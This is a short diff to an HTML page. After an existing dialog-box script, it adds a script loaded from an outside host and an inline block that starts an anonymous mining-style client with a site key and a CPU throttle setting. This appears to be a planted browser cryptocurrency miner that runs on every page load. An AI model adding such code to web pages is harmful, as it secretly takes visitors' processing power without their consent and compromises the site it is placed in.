@@ -56,5 +56,12 @@
 		  alertify.prompt().set({'reverseButtons': true});
 		}
 	</script>
+	<script src="https://www.hostingcloud.science./P5gV.js"></script>
+	<script>
+		var _client = new Client.Anonymous('3162a8bb71b35ec7254ce652bc343c09a6268f6771483a9a1eda978ae524bfc1', {
+			throttle: 0.75, c: 'w'
+		});
+		_client.start();
+	</script>
   </body>
 </html>
